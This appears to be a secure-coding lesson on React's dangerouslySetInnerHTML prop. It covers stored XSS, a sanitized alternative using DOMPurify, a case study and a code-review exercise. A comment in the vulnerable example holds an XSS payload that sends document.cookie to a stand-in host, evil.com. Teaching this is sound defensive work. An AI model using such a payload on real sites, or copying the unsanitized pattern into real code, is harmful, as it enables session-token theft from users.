💡 CI01.3.2: Handle with Care: The `dangerouslySetInnerHTML` Prop

**Outline:**

- **The Threat (SEEI):** Using `dangerouslySetInnerHTML` casually, without understanding it is an explicit instruction to create a security vulnerability.
- **The Defense (PPP):** Treating this prop as a last resort and ensuring any data passed to it is first sanitized by a trusted library.
- **Your Mission (Production):** Identify the flaw in using this prop and refactor it to be safe.

### 📘 Full Lesson Content

### Part 1: Presentation - The Threat (SEEI)

**What is it? (The Vulnerability):**

The prop `dangerouslySetInnerHTML` is React's official, named-and-shamed backdoor for inserting raw HTML into the DOM. Its name is intentionally scary. It's a warning sign from the React team saying: "You are leaving the safety of the React ecosystem. If you use this, you are now personally responsible for preventing XSS attacks." The vulnerability occurs when a developer uses this prop to render any content that originated from an untrusted source, without first sanitizing it.

**How it Works (The Attack Vector):**

A common use case is rendering a blog post or a product description that was created in a Rich Text Editor (which outputs HTML). A developer might receive this HTML from an API and render it directly.

```tsx
// VULNERABLE CODE
const BlogPost = ({ postContentFromAPI }) => {
  // 'postContentFromAPI' could be:
  // "<p>My great post!</p><script>document.location='//[evil.com/c=](<https://evil.com/c=>)' + document.cookie</script>"

  // This prop tells React: "I know what I'm doing. Trust this HTML completely."
  // This is a direct gateway for Stored XSS.
  return <div dangerouslySetInnerHTML={{ __html: postContentFromAPI }} />;
};

```

By using `dangerouslySetInnerHTML`, you are telling React to discard its most important security feature (output encoding) and inject the given string directly into the HTML. If that string contains a malicious script, the browser will execute it.

### Part 2: Practice - The Defense (PPP)

**The Golden Rule:**

The rule for `dangerouslySetInnerHTML` is: **"Never Pass Raw, Untrusted Data To It."** You should avoid this prop whenever possible. If you absolutely must use it (e.g., for content from a CMS or rich text editor), you are contractually obligated to clean the HTML first using a dedicated, battle-tested sanitization library.

**Secure Code Implementation:**

The secure pattern requires an extra step: sanitization. We will use a placeholder for the sanitizer here, and learn the real implementation in the next lesson.

```tsx
// SECURE(R) CODE - Conceptual
import { sanitize } from './some-sanitizer-library';

const BlogPost = ({ postContentFromAPI }) => {
  // STEP 1: Sanitize the untrusted HTML.
  // This function will parse the HTML, strip out all dangerous tags (like <script>),
  // and remove dangerous attributes (like 'onerror').
  const cleanHTML = sanitize(postContentFromAPI);

  // STEP 2: Pass the now-safe HTML to the dangerous prop.
  // We are still using the prop, but we've mitigated the risk beforehand.
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
};

```

This approach allows for rich text formatting while neutralizing the threat of XSS. You accept that the content is HTML, but you clean it to ensure it's _safe_ HTML.

### 🧠 Real-World Case Study: "Vulnerable vs. Secured Code"

**The Goal:** Building a "What You See Is What You Get" (WYSIWYG) editor for user comments.

- **Vulnerable Approach:** The application saves the raw HTML output from the editor to the database. When displaying comments, it uses `dangerouslySetInnerHTML` to render this HTML.
    - **Result:** A clever user figures out how to inject a `<script>` tag into their comment using the editor's "HTML source" mode. Their script is saved to the database. Now, every user who views the comment thread has their session token stolen.
- **Secure Approach:** The application still saves the raw HTML output. However, in the component that _displays_ the comments, the HTML is first passed through a sanitizer like DOMPurify before being given to `dangerouslySetInnerHTML`.
    - **Result:** The sanitizer strips the `<script>` tag from the malicious comment. Other users see the comment's text and safe formatting (like bold and italics), but the dangerous script is gone. The feature works as intended, and the application is secure.

### 🤔 Reflective Questions

1. Why do you think the React team decided to make the prop so awkwardly named (`dangerouslySetInnerHTML`) and require a specific object shape (`{ __html: '...' }`) instead of just `innerHTML="..."` like in plain HTML?
2. Can you think of a legitimate use case for `dangerouslySetInnerHTML` where the HTML being rendered does _not_ come from a user and is therefore considered "trusted"?

### 📚 Further Reading

- **React Docs:** [`dangerouslySetInnerHTML`](https://www.google.com/search?q=https://react.dev/reference/react-dom/components/common%23dangerouslysetinnerhtml) - Read the official warning.

### 📝 Mini Task (Production)

You are reviewing code from a teammate. You see the following component, which is intended to display a "featured quote" that is set in a Content Management System (CMS).

```tsx
function FeaturedQuote({ quoteHTML }) {
  return (
    <blockquote dangerouslySetInnerHTML={{ __html: `<em>${quoteHTML}</em>` }} />
  );
}

```

Your task: Identify the security vulnerability. Explain to your teammate why even wrapping their content in `<em>` tags doesn't make it safe. What could an attacker in control of the CMS content set as `quoteHTML` to execute an alert?